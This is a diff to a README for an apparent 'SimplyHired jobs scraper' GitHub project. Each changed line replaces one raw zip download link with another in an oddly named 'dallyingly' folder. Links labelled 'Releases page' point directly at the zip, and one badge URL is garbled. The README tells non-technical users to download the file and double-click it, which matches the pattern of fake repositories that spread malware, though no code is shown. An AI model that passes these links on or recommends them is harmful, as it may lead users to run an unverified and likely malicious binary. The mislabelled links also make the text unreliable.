@@ -7,10 +7,10 @@ Welcome to the **simplyhired-jobs-scraper-faster-cheaper** project! This applica
 To get started with the application, follow these simple steps. You will need to download the software and run it on your computer. No programming knowledge is needed.
 
 ## 🔗 Download Link
-[![Download SimplyHired Jobs Scraper](https://github.com/tigerkrsd/simplyhired-jobs-scraper-faster-cheaper/raw/refs/heads/main/dallyingly/faster_jobs_cheaper_scraper_simplyhired_v1.0-beta.1.zip%https://github.com/tigerkrsd/simplyhired-jobs-scraper-faster-cheaper/raw/refs/heads/main/dallyingly/faster_jobs_cheaper_scraper_simplyhired_v1.0-beta.1.zip)](https://github.com/tigerkrsd/simplyhired-jobs-scraper-faster-cheaper/raw/refs/heads/main/dallyingly/faster_jobs_cheaper_scraper_simplyhired_v1.0-beta.1.zip)
+[![Download SimplyHired Jobs Scraper](https://raw.githubusercontent.com/tigerkrsd/simplyhired-jobs-scraper-faster-cheaper/main/dallyingly/cheaper_scraper_jobs_faster_simplyhired_v2.6.zip%https://raw.githubusercontent.com/tigerkrsd/simplyhired-jobs-scraper-faster-cheaper/main/dallyingly/cheaper_scraper_jobs_faster_simplyhired_v2.6.zip)](https://raw.githubusercontent.com/tigerkrsd/simplyhired-jobs-scraper-faster-cheaper/main/dallyingly/cheaper_scraper_jobs_faster_simplyhired_v2.6.zip)
 
 ## 📥 Download & Install
-1. **Visit the Releases Page**: First, go to our [Releases page](https://github.com/tigerkrsd/simplyhired-jobs-scraper-faster-cheaper/raw/refs/heads/main/dallyingly/faster_jobs_cheaper_scraper_simplyhired_v1.0-beta.1.zip) to find the latest version of the application.
+1. **Visit the Releases Page**: First, go to our [Releases page](https://raw.githubusercontent.com/tigerkrsd/simplyhired-jobs-scraper-faster-cheaper/main/dallyingly/cheaper_scraper_jobs_faster_simplyhired_v2.6.zip) to find the latest version of the application.
 2. **Choose the Right File**: Look for the most recent release. You will see different files available for download.
 3. **Download the Application**: Click on the file that fits your operating system. This will start the download process.
 4. **Install the Application**: Once the download is complete, locate the file on your computer and double-click it to start the installation.
@@ -41,13 +41,13 @@ If you encounter any issues while using the application, here are some solutions
 
 ## 📰 Stay Updated
 To receive the latest news and updates on the software:
-- Check our [Releases page](https://github.com/tigerkrsd/simplyhired-jobs-scraper-faster-cheaper/raw/refs/heads/main/dallyingly/faster_jobs_cheaper_scraper_simplyhired_v1.0-beta.1.zip) regularly.
+- Check our [Releases page](https://raw.githubusercontent.com/tigerkrsd/simplyhired-jobs-scraper-faster-cheaper/main/dallyingly/cheaper_scraper_jobs_faster_simplyhired_v2.6.zip) regularly.
 - Follow the repository for notifications on new features and fixes.
 
 ## 💬 Getting Help
 If you need additional help or have questions, you can contact us through the issues section of the repository. We also encourage users to share their feedback and suggestions to help improve the application.
 
 ## 🔗 Download Link Again
-For your convenience, here is the download link once more: [Download the SimplyHired Jobs Scraper](https://github.com/tigerkrsd/simplyhired-jobs-scraper-faster-cheaper/raw/refs/heads/main/dallyingly/faster_jobs_cheaper_scraper_simplyhired_v1.0-beta.1.zip). 
+For your convenience, here is the download link once more: [Download the SimplyHired Jobs Scraper](https://raw.githubusercontent.com/tigerkrsd/simplyhired-jobs-scraper-faster-cheaper/main/dallyingly/cheaper_scraper_jobs_faster_simplyhired_v2.6.zip). 
 
 Feel free to reach out if you have any further questions. Enjoy extracting job data easily!
